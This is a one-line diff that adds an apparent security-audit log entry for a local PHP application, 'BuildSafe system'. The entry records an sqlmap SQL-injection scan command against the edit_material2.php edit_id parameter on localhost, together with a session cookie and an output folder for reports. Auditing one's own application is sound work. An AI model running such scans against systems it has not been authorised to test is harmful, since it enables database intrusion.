@@ -1,0 +1,1 @@
+http://localhost/buildsafe_system1/edit_material2.php?edit_id=1 (GET)  # sqlmap.py -u http://localhost/buildsafe_system1/edit_material2.php?edit_id=1 --cookie=PHPSESSID=o80l4sa358j77vlk6530gusu9a --batch --level=2 --risk=1 --output-dir=C:\Users\Moises\Documents\Code\Auditoria-BuildSafesystem\sqlmap_reports
